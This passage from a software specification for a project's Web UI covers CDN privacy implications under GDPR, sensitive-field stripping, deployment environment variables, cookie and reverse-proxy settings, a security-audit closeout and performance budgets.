The Web UI loads two third-party CDN origins per SR-001 / FR-002:

| Origin | Purpose | Data leak |
|----|----|----|
| `cdn.jsdelivr.net` | React / ReactDOM / marked / DOMPurify | Browser → jsDelivr (Cloudflare-fronted): referrer (`no-referrer` minimizes) + client IP |
| `unpkg.com` | Babel Standalone | Browser → unpkg (Cloudflare-fronted): referrer + client IP |

For EU deployments serving EU data subjects, every browser request to these CDNs is a third-country transfer under Art. 44. The transfer is initiated by the participant's browser (not the orchestrator) so SACP's role is upstream — but operators MUST be aware:

- jsDelivr is operated by ProspectOne (Poland) on Cloudflare infrastructure (US / global)
- unpkg is operated by Cloudflare directly (US / global)
- Both serve over HTTPS; SR-002's `Referrer-Policy: no-referrer` minimizes the referrer leak; client IP is unavoidable

SRI integrity attributes (SR-001 task T204) protect against tampered CDN responses but do not address the IP / referrer transfer.

**Phase 3 mitigation**: bundle the static assets server-side (eliminate the CDN dependency). Trigger: any EU deployment where third-party CDN transfer is unacceptable to the operator's DPIA. The CDN approach was chosen for Phase 1 simplicity (no build toolchain per FR-002); a build pipeline is the prerequisite for self-hosting.

### Confidentiality controls (Art. 32)

Two SRs serve as PII-equivalent confidentiality controls at the UI boundary:

- **SR-007** ("no API keys / system prompts in UI"): system prompts may contain operator-supplied instructions and business logic; they are confidentiality-sensitive even though not classical PII. SR-007 enforces server-side that they never enter the WS payload. Cross-ref 010 §FR-9 (debug-export equivalent).
- **SR-011** (sensitive-field strip-list at WS boundary): `api_key_encrypted`, `auth_token_hash`, `bound_ip`, `system_prompt` stripped at `_participant_dict` serializer. This is data minimization at the WS broadcast boundary (Art. 5(1)(c)). The Web UI's React renderer adds defense-in-depth via allow-list serialization; even if the server forgets, the client silently drops unknown keys.

### Subject rights at the UI boundary

**Self-service Art. 15 / Art. 20**: deferred to Phase 3 (sister 010 Compliance / Privacy section is authoritative). No browser-side download surface for "my session history" exists today. Phase 1 fulfilment is operator-mediated via 010 debug-export + manual filtering. Phase 3 trigger: any deployment serving EU data subjects where the Web UI is the primary participant-facing surface. At that point, a participant-facing "download my data" button surfaces alongside the existing UI.

### Cross-references

- `docs/compliance-mapping.md` — project-wide GDPR mapping (Art. 5(c) / 13 / 32 / 44 rows authoritative)
- 002 Compliance / Privacy section — auth-surface lawful-basis + retention
- 003 Compliance / Privacy section — Art. 28 / Art. 44 cross-border transfer (sister; the WS payload is upstream of the litellm dispatch)
- 007 Compliance / Privacy section — Art. 33 breach signalling + log-scrubbing
- 010 Compliance / Privacy section — Art. 15 / Art. 20 boundary (operator-mediated in Phase 1)

## Operations (Phase E fix/011-operations, 2026-05-02)

This section documents 011's operator-facing decisions for Web UI deployment. Operator playbook lives in `docs/operational-runbook.md` §13 (Web UI ops).

### Tunable env vars (operator decision points)

| Variable | Purpose | Default |
|---|---|---|
| `SACP_WEB_UI_INSECURE_COOKIES` | Force-off override for cookie Secure flag (auto-detected from request scheme by default) | unset |
| `SACP_WEB_UI_MCP_ORIGIN` | Origin string used in CSP `connect-src` for MCP API calls | (operator-supplied) |
| `SACP_WEB_UI_WS_ORIGIN` | Origin string used in CSP `connect-src` for WebSocket | (operator-supplied) |
| `SACP_WEB_UI_ALLOWED_ORIGINS` | CSV of accepted Origin headers on WS upgrade (SR-004) | same-origin |
| `SACP_WEB_UI_COOKIE_KEY` | Independent cookie-signing key (≥ 32 chars, no placeholder) | (required) |
| `SACP_WS_MAX_CONNECTIONS_PER_IP` | Per-IP WS connection cap (4429 close on exceed) | 10 |

Cross-ref `docs/env-vars.md` for the canonical catalog.

### Deploy semantics

**Single-instance topology** (Phase 1) — one orchestrator process serves both MCP (port 8750) and Web UI (port 8751); all WS connections terminate at this process. On redeploy, all WS connections close; clients reconnect via FR-014 auto-reconnect with exponential backoff.

**Multi-instance / WS session affinity** — deferred to Phase 3. Implementation surface: load-balancer sticky-session config OR externalize SessionStore to Redis (the in-process `SessionStore` keyed by sid currently). Trigger: any deployment requiring HA Web UI pods.

**Multi-tenant** — explicit single-tenant in Phase 1. One operator org, one DB, one origin. Multi-tenant deferred.

### HTTP vs HTTPS posture

The session cookie's `Secure` flag is auto-detected from the inbound request scheme: HTTPS requests get `Secure`, HTTP requests do not. SameSite=Strict and HttpOnly apply unconditionally.

- **Production direct-TLS**: HTTPS reaches the orchestrator directly. The request scheme is `https`, the cookie carries `Secure`. No env vars required.
- **Production behind TLS-terminating reverse proxy**: set `SACP_TRUST_PROXY=1` so the orchestrator honors `X-Forwarded-Proto` from the proxy; the cookie still gets `Secure` even though the inner request is HTTP. Same env var that governs IP-binding trust, so the trust decision is co-located.
- **LAN / dev**: HTTP-only deployment works out of the box. Auto-detect sees `http` and omits `Secure` so the cookie round-trips as expected.
- **Explicit override**: `SACP_WEB_UI_INSECURE_COOKIES=1` forces the flag off regardless of scheme. Kept for operator control and back-compat; unnecessary for the LAN/HTTP case after auto-detect.

Pre-fix the flag defaulted to on, so a LAN/HTTP deploy silently broke after login: the browser stored the cookie but refused to send it back, deadlocking every cookie-authed call (proxy 401, WebSocket 4401). Runbook §13's deploy-time sanity check (HTTPS deploy with `INSECURE_COOKIES=1` warning) still applies.

### CDN dependency

Web UI loads React, ReactDOM, marked, DOMPurify (jsdelivr) + Babel Standalone (unpkg) per FR-002 / SR-001. Operational implications:

- **Availability**: CDN downtime → UI fails to load. No Phase 1 fallback bundle. Accepted residual; CDN uptime is a deployment dependency.
- **Tampering**: SR-001 SRI integrity attributes on every cross-origin `<script>` (T204) protect against tampered CDN responses.
- **Privacy**: see Compliance / Privacy section "Third-party CDN risk" — Art. 44 transfer for EU deployments.
- **Phase 3 mitigation**: server-side bundling (eliminates CDN dependency); trigger documented in Compliance / Privacy section.

### CSP wiring

`SACP_WEB_UI_MCP_ORIGIN` + `SACP_WEB_UI_WS_ORIGIN` MUST be set to the operator's deployment origins. The orchestrator constructs CSP `connect-src` from these vars per SR-001. Misconfiguration symptoms:

- WS connection fails immediately with browser-side CSP violation
- `/csp-report` receives a violation report identifying the blocked origin

CSP-report log retention: see Compliance / Privacy section "CSP report-uri PII handling".

### Reverse-proxy configurations

Phase 1 documented configurations: **Caddy**, **nginx**, **Cloudflare**. Required behavior:

- WS upgrade headers (`Upgrade`, `Connection`) preserved
- `X-Forwarded-For` set (for 002 §FR-023 IP-binding when `SACP_TRUST_PROXY=1`)
- `X-Forwarded-Proto: https` set so the orchestrator emits HTTPS-only redirects
- CSP reporting (`/csp-report` POSTs) allowed through
- `X-SACP-Request: 1` CSRF header NOT stripped on mutations (SR-006)
- WS frame size cap of 256 KB (SR-001a) preserved or set higher

Sample configurations in runbook §13.2.

### Cross-references

- `docs/operational-runbook.md` §13 — Web UI operations (deploy, reverse-proxy, CDN, CSP)
- `docs/env-vars.md` — canonical catalog of `SACP_WEB_UI_*` vars
- 002 §FR-022 — bearer auth contract (cross-spec; reverse-proxy MUST preserve `Authorization` header on `/api/mcp/*` proxy)
- 002 §FR-023 — TRUST_PROXY semantics for IP binding
- 011 §FR-002 — CDN-loaded SPA constraint
- 011 §FR-014 — WebSocket auto-reconnect
- 011 SR-001, SR-001a, SR-002 — CSP, WS frame cap, security headers
- 011 SR-004 — WS Origin validation
- 011 SR-006 — CSRF custom header

## Audit closeout (2026-04-29)

The security-requirements quality audit (`checklists/security.md`) raised 47 findings; resolution split:

**Code changes**:
- CHK013 (uvicorn `ws_max_size=256*1024` in `src/run_apps.py` — closes WebSocket OOM surface).
- CHK003 (CSP `report-uri /csp-report` directive added to `src/web_ui/security.py`; new `/csp-report` endpoint stub in `src/web_ui/app.py` logs the violation at WARNING and returns 204; CSRF middleware exempts the path so browsers can post reports without the custom header).

**Spec amendments (this commit)**: CHK001 (SR-001 clarifies SRI applies to cross-origin CDN scripts only; `app.jsx` is same-origin and exempt), CHK003 / CHK032 (SR-001 codifies `report-uri`; SR-012 codifies malformed-frame discard semantics), CHK005 / CHK006 (SR-002 pins exact HSTS / Permissions-Policy / X-Frame-Options values + Phase 3 trigger for additional directives), CHK013 (SR-001a codifies WS frame size cap), CHK016 / CHK019 (SR-009 codifies allowed-scheme list + `rel="noreferrer noopener"` mandate + Phase 3 trigger for additional schemes), CHK020 / CHK022 (SR-010 codifies pending-snapshot filter + acknowledged event-filter gap as accepted residual with Phase 3 trigger), CHK023 (SR-005 cross-ref pins "sanitized = output of marked + DOMPurify"), CHK033 / CHK045 (SR-011 codifies sensitive-field allow-list + defense-in-depth duplication + cross-ref 010), CHK039 (Threat-model traceability table mapping every FR / SR to OWASP ASVS L2 + NIST SP 800-53), SR-008 cross-reference to SR-002 for consolidation.

**Closed as cross-reference / accepted residual**: CHK002 (CSP `connect-src` operator-config — operators set `SACP_WEB_UI_MCP_ORIGIN`; covered in SR-001), CHK004 (precompile-at-build alternative — accepted residual; SR-001 documents trigger), CHK007 / CHK008 (token storage + rotation timing — covered by 002 §FR-008 + this spec FR-003), CHK010 (token-reveal modal one-time-only — accepted residual; user can re-rotate to recover), CHK011 (WS Origin exact-match — confirmed at `src/web_ui/websocket.py`), CHK012 (close-code semantics — FR-014 enumerates), CHK014 (rotation gap — same as CHK008), CHK015 / CHK017 / CHK018 / CHK046 (markdown defense-in-depth — server (007) + UI (FR-006) layered intentionally), CHK021 (pending → participant escalation timing — covered by `participant_update` WS event + `state_snapshot` re-sync on reconnect), CHK024 (CSRF custom header on mutations only — WS frames don't need it; Origin validation defends), CHK025 (SR-007 own vs other system_prompt — accepted: NO participant sees any system_prompt via WS; allow-list strips them all), CHK026 (markdown XSS test corpus — accepted residual; comprehensive XSS-corpus testing requires JS test framework not in Phase 1+2 scope; manual red-team via `docs/red-team-runbook.md`), CHK027 (own row strip — confirmed at `_participant_dict` allow-list), CHK028 (whitespace-in-token sign-in — accepted residual; token validation handles edge cases), CHK029 (rotation SSOT — covered by 002 §FR-008 + this spec FR-003), CHK030 (XSS test fixture — same as CHK026), CHK031 (WS reconnect under packet loss — covered by FR-014 exponential backoff), CHK034 (multi-tab — accepted residual; cookie shared, last-WS-wins), CHK035 / CHK036 (large / adversarial markdown DoS — accepted residual; client-side bound by browser), CHK037 (clipboard-readText cross-origin — browser policy enforces, not our concern), CHK038 (whitespace-in-token-paste — token validation handles), CHK040 (CDN failure fallback — accepted residual already in Assumptions), CHK041 (a11y deferred — Assumptions trigger documented), CHK042 / CHK043 (Babel Standalone reliance — accepted; precompile trigger documented), CHK044 (US11 / US12 onboarding security review — implicit in this audit), CHK047 (CSRF cross-origin custom header — accepted: browsers prevent custom headers cross-origin; rationale in SR-006).

## Performance budgets (Phase F amendment, 2026-05-02)

These targets pin the Web UI's perceived-latency and rendering contract.
Cross-referenced from `AUDIT_PLAN.local.md` Batch 4 → 011 web-vitals.
The full budget configuration is checked in at `.lighthouserc.json` at
the repo root; it documents the contract and is ready to run via
`lhci autorun` once the staging fixture lands.

**Core Web Vitals targets.**
- Largest Contentful Paint (LCP) ≤ 2.5s ("good"); ≤ 4.0s
  ("needs improvement"); > 4.0s fails the budget.
- Interaction to Next Paint (INP) ≤ 200ms ("good"); ≤ 500ms
  ("needs improvement").
- Cumulative Layout Shift (CLS) ≤ 0.1 ("good"); ≤ 0.25 ("needs
  improvement").

**Other targets.**
- First Contentful Paint (FCP) ≤ 1.8s.
- Time to First Byte (TTFB) ≤ 800ms (LAN deployments will be
  much lower).
- Total Blocking Time (TBT) ≤ 200ms.
- Speed Index ≤ 3.4s.
- Lighthouse performance / a11y / best-practices score ≥ 0.9.

**Babel Standalone JIT compilation cost.** The SPA uses Babel
Standalone to transpile JSX in the browser at load time. Cold-load
cost on a representative laptop: ~400-800ms wall-clock for a single-
file `app.jsx` of ~2000 lines. This dominates the FCP budget. If the
file grows past ~3500 lines OR the FCP budget is breached on the
LAN-deploy reference hardware, the precompile-at-build trigger fires
(see Assumptions / CHK004). Phase 3+ may move to a precompiled bundle.

**CDN-fetch latency.** The SPA loads Babel Standalone, React, and
ReactDOM from `cdn.jsdelivr.net` and `unpkg.com`. CDN unavailability
is an accepted residual: the SPA fails to load, the user sees a
blank page. Operators with CDN-block constraints MUST self-host the
three scripts under `/static/vendor/` and update `index.html`; that
is supported by the existing static-file route but is not the
default. The CDN add-up budget against TTFB is bounded by browser
caching after first load.

**Single-file JSX rendering cost.** `app.jsx` ships as one ~2000-line
file. React's diffing keeps re-render cost bounded by visible-virtual-
DOM size (not full tree size), so the practical cost is dominated by
state-snapshot rendering on WS-message arrival. Splitting into
multiple `<script type="text/babel">` files is a Phase 3 enhancement
gated on file growing past ~3500 lines OR LCP budget breach.

**WebSocket steady-state perf.** Target: message-arrives-to-rendered
latency ≤ 100ms P95 on the reference hardware. State-snapshot
re-renders for unrelated participants should NOT trigger; this is
enforced by React keys on participant array elements. A regression
here surfaces as INP budget breach.

**Scroll perf on 200-message transcript.** The Assumption-cap
transcript size is 200 messages. Scroll perf at this size is
acceptable without virtualization on a desktop browser. Beyond 200
messages (Phase 3 trigger), virtualization (e.g., `react-window`)
becomes mandatory. The perf cliff lands roughly at 400-500 messages
on a representative laptop.

**Large state-snapshot rendering cost.** A facilitator with 50
participants + 200 messages + 5 active drafts is the upper-bound
"realistic large session" shape. Initial render cost on this shape:
~150-300ms wall-clock against React 18's concurrent renderer. State-
snapshot diffing on subsequent updates is bounded by what changed
(usually 1-2 participants OR 1-2 messages), so the steady-state cost
stays well under the INP budget.

**Sparkline rendering cost (FR-011).** Convergence sparkline today is
SVG with ~20 data points per session. Cost is negligible (< 5ms per
render). Canvas was considered and deferred — SVG keeps the dev
ergonomics (CSS-able, accessible) and the data point count is far
below the SVG-vs-canvas crossover (~500 points).

**Image-handling perf (FR-006).** The 007 §FR-007 exfiltration filter
strips markdown images at message persistence; FR-006 of 011 does NOT
re-render images client-side. Per-message strip cost is constant-time
regex (~1ms even for very long messages), well within the steady-
state INP budget.

**Activation trigger.** Lighthouse CI runs are not yet wired into the
GitHub Actions workflow. Activation requires a staging fixture that
brings up `web_ui.app` with a seeded session; this is a cross-spec
integration audit deliverable (Phase 4 / 012 successor). Until then
operators run `lhci autorun --config=.lighthouserc.json` manually
against a local instance.

## Topology and Use Case Coverage (V12/V13)

**Topologies**: Serves topologies 1-6 (orchestrator-driven). Topology 7 (MCP-to-MCP) would use the same WebSocket events but with different auth flow — deferred to Phase 3.

**Use cases**: All 7 constitution use cases benefit from the Web UI. Especially valuable for: knowledge-base (US1, long-running sessions need a dashboard), debate (US2, proposal voting UI), consulting (US4, review gate approval), and zero-trust cross-org (US5, facilitator admin controls).

## Implementation Phases

The Web UI is large enough to warrant internal phasing:

### Phase 2a — Core (ship first)
- AuthGate (token login)
- Three-column layout skeleton
- Transcript with markdown rendering + security pipeline
- Message injection input
- Participant list sidebar
- WebSocket connection + reconnection
- Session controls (pause/resume/start/stop loop)
- Facilitator: add participant, set routing preference, set budget
- Header bar (session name, status, turn counter, connection indicator)

### Phase 2a — Core (ship first, continued)
- Participant health indicator (US10) — lives on the participant list from 2a, surfaces breaker trips so facilitators can diagnose silent AIs immediately

### Phase 2b — Dashboard
- Budget dashboard (per-participant spend cards)
- Convergence sparkline graph
- Cadence indicator
- Summary panel (US9) — renders latest structured checkpoint
- Facilitator admin panel (pending approvals, session config, invite gen, audit log, review-gate pause-scope toggle)

### Phase 2c — Workflows
- Review gate queue with approve/edit/reject
- Proposal tracker with voting
- Session export (markdown/JSON download)
- Summarization timeline scrubber

## Out of Scope

- Branching UI and rollback visualization (Phase 3)
- Sub-session tree navigation (Phase 3)
- OAuth 2.1 with PKCE login flow (Phase 3)
- MCP-to-MCP topology 7 integration (Phase 3)
- Artifact store (Phase 3)
- Internationalization
- Native mobile app
